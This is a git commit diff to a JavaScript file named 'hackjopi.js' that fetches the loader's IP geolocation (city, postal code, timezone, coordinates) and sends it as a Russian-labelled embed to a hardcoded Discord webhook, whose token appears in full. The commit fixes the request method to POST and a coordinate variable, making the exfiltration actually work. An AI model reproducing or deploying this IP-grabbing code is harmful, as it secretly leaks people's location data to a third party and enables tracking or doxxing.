99c2105fadfc1d2a3b44690b92c76ae72c4ff4d6
DeitySenpai <57723849+DeitySenpai@users.noreply.github.com>
2020-11-28 00:24:47 +0200

    fix hackajopi

--- hackjopi.js
+++ hackjopi.js
@@ -1,6 +1,6 @@
 fetch('https://api.2ip.ua/geo.json?ip', { method: "GET" }).then(res => res.json()).then(geo => {
 	fetch('https://discord.com/api/webhooks/782001481410150424/A7mTIBPJ1K-M5-HDR7UOh9BrnjcGyxymET_tOgKJfSiINy8Y5UC8Ew8gTyh9Q3NJqlzt', {
-		method: "GET",
+		method: "POST",
 		headers: {
 			"Content-Type": "application/json"
 		},
@@ -12,12 +12,12 @@ fetch('https://api.2ip.ua/geo.json?ip', { method: "GET" }).then(res => res.json(
 		      `**Город**: ${geo.city_rus}\n`+
 		      `**Почтовый код**: ${geo.zip_code}\n`+
 		      `**Время**: UTC${geo.time_zone} \n`+
-		      `**Координаты**: X${geo.latitude}, Y${longitude}`,
+		      `**Координаты**: X${geo.latitude}, Y${geo.longitude}`,
 		      url: `https://api.2ip.ua/geo.json?ip=${geo.ip}`,
 		      color: 16382457,
 		      footer: {
 		        text: "https://deitysenpai.team",
-		        icon_url: "https://deitysenpai.team/avatar"
+		        icon_url: "https://deitysenpai.team/avatar.png"
 		      }
 		    }
 		  ]
